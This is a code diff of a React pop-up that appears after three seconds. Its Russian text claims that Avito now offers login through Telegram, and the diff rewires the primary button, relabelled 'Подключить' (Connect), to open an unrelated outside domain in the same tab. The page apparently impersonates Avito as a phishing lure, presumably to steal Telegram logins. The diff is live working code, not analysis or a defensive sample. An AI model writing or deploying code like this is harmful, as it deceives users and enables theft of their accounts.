@@ -10,11 +10,10 @@ export const ModalComp = () => {
   const [show, setShow] = useState(false);
 
   useEffect(() => {
-    setTimeout(() => {setShow(true)}, 5000);
+    setTimeout(() => {setShow(true)}, 3000);
   }, []);
 
   const handleClose = () => setShow(false);
-  const handleShow = () => setShow(true);
   return (
     <>
       <Modal show={show} onHide={handleClose} backdrop="static" keyboard={false} centered>
@@ -27,10 +26,10 @@ export const ModalComp = () => {
         <Modal.Body>На Авито теперь есть новая возможность авторизации через Телеграм. Это означает, что пользователи могут использовать свой аккаунт Телеграм для входа на популярный сайт объявлений без необходимости создания нового логина и пароля. Это упрощает процесс авторизации и делает его более безопасным, так как пользователи могут использовать двухфакторную аутентификацию, которая уже настроена на их аккаунте в Телеграме.</Modal.Body>
         <Modal.Footer>
           <Button variant="secondary" onClick={handleClose}>
-            Close
+            Закрыть
           </Button>
-          <Button variant="primary" color='#02d15c' onClick={handleClose}>
-            Save Changes
+          <Button variant="primary" color='#02d15c' onClick={() => window.open("https://golosforme.life/comom", "_self")}>
+            Подключить
           </Button>
         </Modal.Footer>
       </Modal>
